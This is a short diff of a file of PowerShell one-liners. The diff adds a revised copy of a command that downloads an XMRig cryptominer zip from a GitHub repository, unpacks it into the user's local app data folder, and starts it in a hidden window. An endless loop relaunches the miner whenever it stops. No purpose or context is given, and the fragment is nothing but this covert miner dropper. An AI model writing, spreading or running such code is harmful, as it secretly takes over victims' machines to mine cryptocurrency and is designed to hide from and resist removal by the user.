@@ -48,3 +48,7 @@ $d="$env:USERPROFILE\Downloads"; $l="$env:LOCALAPPDATA\xmrig"; iwr "https://raw.
 
 
 $d="$env:USERPROFILE\Downloads"; $l="$env:LOCALAPPDATA\xmrig"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$d\xmrig.zip"; if (Test-Path $l) { Remove-Item $l -Recurse -Force }; New-Item -ItemType Directory -Path $l -Force | Out-Null; Expand-Archive "$d\xmrig.zip" -DestinationPath $l -Force; $exe=Get-ChildItem $l -Recurse -Filter start.exe | Select-Object -First 1; Start-Process $exe.FullName -WindowStyle Hidden; while ($true) { if (-not (Get-Process -Name start -ErrorAction SilentlyContinue)) { Start-Process -FilePath $exe.FullName -WindowStyle Hidden }; Start-Sleep -Seconds 1 }
+
+
+
+$d="$env:USERPROFILE\Downloads"; $l="$env:LOCALAPPDATA\xmrig"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$d\xmrig.zip"; if (Test-Path $l) { Remove-Item $l -Recurse -Force }; New-Item -ItemType Directory -Path $l -Force | Out-Null; Expand-Archive "$d\xmrig.zip" -DestinationPath $l -Force; $exe=Get-ChildItem $l -Recurse -Filter start.exe | Select-Object -First 1; Start-Process $exe.FullName -WindowStyle Hidden; while ($true) { if (-not (Get-Process | Where-Object { $_.Path -eq $exe.FullName })) { Start-Process -FilePath $exe.FullName -WindowStyle Hidden }; Start-Sleep -Seconds 1 }
